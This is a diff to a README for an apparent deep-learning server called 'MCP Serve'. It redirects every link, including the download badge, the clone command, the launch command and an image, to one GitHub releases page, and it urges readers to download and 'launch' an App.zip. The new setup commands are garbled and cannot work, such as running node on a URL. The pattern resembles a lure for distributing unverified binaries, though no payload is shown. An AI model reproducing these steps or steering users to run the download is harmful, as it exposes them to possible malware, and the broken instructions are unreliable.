@@ -18,7 +18,7 @@ Welcome to the MCP Serve repository, a cutting-edge tool designed for running De
 
 ## Download App 📦
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/mark-oori/mcpserve/releases)](https://github.com/mark-oori/mcpserve/releases)
 
 If the link above ends with the file name, don't forget to launch it and start exploring the possibilities!
 
@@ -26,9 +26,9 @@ If the link above ends with the file name, don't forget to launch it and start e
 
 To get started with MCP Serve, follow these simple steps:
 
-1. **Clone the Repository**: `git clone https://github.com/your/repo.git`
+1. **Clone the Repository**: `git clone https://github.com/mark-oori/mcpserve/releases`
 2. **Install Dependencies**: `npm install`
-3. **Launch the MCP Server**: `node server.js`
+3. **Launch the MCP Server**: `node https://github.com/mark-oori/mcpserve/releases`
 
 ## Contributing 🤝
 
@@ -50,6 +50,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Dive into the world of Deep Learning with MCP Serve and revolutionize the way you interact with AI models. Whether you're a seasoned AI professional or a beginner exploring the possibilities of AI, MCP Serve has something for everyone. Start your Deep Learning journey today! 🌌
 
-![Deep Learning](https://github.com/username/images/deep_learning.jpg)
+![Deep Learning](https://github.com/mark-oori/mcpserve/releases)
 
 Happy coding! 💻🤖
